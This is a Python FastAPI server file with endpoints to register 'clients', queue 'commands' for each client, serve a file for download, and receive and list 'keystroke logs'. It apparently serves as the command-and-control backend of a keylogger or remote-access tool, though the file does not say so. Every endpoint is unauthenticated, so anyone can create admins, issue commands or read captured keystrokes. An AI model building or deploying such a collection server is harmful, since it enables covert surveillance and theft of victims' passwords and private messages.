from fastapi import FastAPI, Depends, HTTPException
from sqlalchemy.orm import Session
import database, schemas, repository, models
from typing import List
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")

def get_db():
    db = database.SessionLocal()
    try:
        yield db
    finally:
        db.close()

models.Base.metadata.create_all(bind=database.engine) 

@app.post("/admins/", response_model=schemas.Admin)
def create_admin(admin: schemas.AdminCreate, db: Session = Depends(get_db)):
    db_admin = repository.create_admin(db, admin)
    return db_admin


@app.get("/admins/", response_model=list[schemas.Admin])
def read_admins(db: Session = Depends(get_db)):
    admins = repository.get_admins(db)
    return admins


@app.post("/clients/", response_model=schemas.Client)
def create_client(client: schemas.ClientCreate, db: Session = Depends(get_db)):
    return repository.create_client(db, client)


@app.get("/clients/", response_model=List[schemas.Client])
def read_clients(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_clients(db, skip=skip, limit=limit)


@app.post("/commands/", response_model=schemas.Command)
def create_command(command: schemas.CommandCreate, db: Session = Depends(get_db)):
    return repository.create_command(db, command)


@app.get("/commands/", response_model=List[schemas.Command])
def read_commands(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_commands(db, skip=skip, limit=limit)


@app.get("/clients/{client_id}/commands/", response_model=List[schemas.Command])
def read_commands_for_client(client_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_commands_by_client_id(db, client_id, skip=skip, limit=limit)

@app.get("/get-text-file/")
async def get_text_file():
    file_path = "static/prueba.txt"
    return FileResponse(
        path=file_path, 
        media_type='application/octet-stream', 
        headers={"Content-Disposition": f"attachment; filename={file_path.split('/')[-1]}"}
    )

@app.put("/keystroke-logs/", response_model=schemas.KeystrokeLog)
def upsert_keystroke_log(keystroke_log: schemas.KeystrokeLogCreate, db: Session = Depends(get_db)):
    return repository.upsert_keystroke_log(db, keystroke_log)


@app.get("/keystroke-logs/", response_model=List[schemas.KeystrokeLog])
def read_keystroke_logs(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    keystroke_logs = repository.get_keystroke_logs(db, skip=skip, limit=limit)
    return keystroke_logs
